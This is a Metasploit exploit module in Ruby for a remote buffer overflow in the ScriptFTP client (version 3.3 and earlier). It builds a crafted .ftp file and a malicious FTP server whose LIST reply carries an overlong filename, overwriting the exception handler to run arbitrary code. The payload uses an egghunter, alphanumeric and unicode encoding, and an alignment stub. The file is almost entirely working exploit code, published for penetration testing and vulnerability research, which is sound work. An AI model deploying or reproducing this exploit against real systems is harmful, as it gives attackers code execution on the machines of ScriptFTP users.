##
# $Id: scriptftp_list.rb 13841 2011-10-09 05:36:42Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ScriptFTP <= 3.3 Remote Buffer Overflow (LIST)',
			'Description'    => %q{
					AmmSoft's ScriptFTP client is susceptible to a remote buffer overflow
				vulnerability that is triggered when processing a sufficiently long filename during
				a FTP LIST command resulting in overwriting the exception handler. Social engineering
				of executing a specially crafted ftp file by double click will result in connecting to
				our malcious server and perform arbitrary code execution which allows the attacker
				to gain the same rights as the user running ScriptFTP.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 13841 $",
			'Author'         =>
				[
					'modpr0be', #Vulnerability discovery and original exploit
					'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module
					'mr_me <steventhomasseeley[at]gmail.com>',  # Metasploit module
				],
			'References'     =>
				[
					#[ 'CVE', '?' ],
					#[ 'OSVDB', '?' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/17876/' ],
					[ 'URL', 'http://www.kb.cert.org/vuls/id/440219' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'DisablePayloadHandler' => 'false',
				},
			'Payload'        =>
				{
					'BadChars'        => "\x00\xff\x0d\x5c\x2f\x0a",
					'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions'  =>
					{
						'BufferRegister' => 'EDI',  # Egghunter jmp edi
					}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# CALL DWORD PTR SS:[EBP-4]
					# scriptftp.exe - File version=Build 3/9/2009
					[ 'Windows XP SP3 / Windows Vista', { 'Offset' => 1746, 'Ret' => "\xd6\x41" } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2011',
			'DefaultTarget'  => 0))

			register_options(
			[
				OptString.new('FILENAME',   [ true, 'The file name.',  'msf.ftp']),
			], self.class)

	end

	def setup
		if datastore['SRVHOST'] == '0.0.0.0'
			lhost = Rex::Socket.source_address('50.50.50.50')
		else
			lhost = datastore['SRVHOST']
		end

		ftp_file = "OPENHOST('#{lhost}','ftp','ftp')\r\n"
		ftp_file << "SETPASSIVE(ENABLED)\r\n"
		ftp_file << "GETLIST($list,REMOTE_FILES)\r\n"
		ftp_file << "CLOSEHOST\r\n"

		print_status("Creating '#{datastore['FILENAME']}'...")
		file_create(ftp_file)
		super
	end


	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)

		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end

		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")

		code = 226
		c.put("#{code} Directory send ok.\r\n")

		eggoptions =
		{
			:checksum => false,
			:eggtag => 'cure'
		}

		hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)

		# Encode with alphamixed, then unicode mixed
		[ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|
			enc = framework.encoders.create(name)
			if name =~ /unicode/
				# aligned to ESP & EAX
				enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
			else
				enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })
			end
			# NOTE: we already eliminated badchars
			hunter = enc.encode(hunter, nil, nil, platform)
			if name =~/alpha/
				#insert getpc_stub & align EDX, unicode encoder friendly.
				#Hardcoded stub is not an issue here because it gets encoded anyway
				getpc_stub = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
				hunter = getpc_stub + hunter
			end
		}

		unicode_nop = "\x6d" # DD BYTE PTR DS:[ECX],AL

		nseh = "\x61" << unicode_nop
		seh = target.ret

		alignment = "\x54"  # PUSH ESP
		alignment << unicode_nop
		alignment << "\x58"  # POP EAX
		alignment << unicode_nop
		alignment << "\x05\x12\x11"  # ADD EAX,11001200
		alignment << unicode_nop
		alignment << "\x2d\x01\x01"  # SUB EAX,1000100
		alignment << unicode_nop
		alignment << "\x2d\x01\x10"  # SUB EAX,10000100
		alignment << unicode_nop
		alignment << "\x50"  # PUSH EAX
		alignment << unicode_nop
		alignment << "\xc3"  # RETN

		buffer = rand_text_alpha(656)
		buffer << hunter
		buffer << rand_text_alpha(target['Offset']-buffer.length)
		buffer << nseh
		buffer << seh
		buffer << alignment
		buffer << rand_text_alpha(500)
		buffer << egg

		print_status(" - Sending directory list via data connection")
		dirlist =  "-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n"
		dirlist << "   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\n"
		dirlist << "rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n"

		conn.put(dirlist)
		conn.close
		return
	end

end
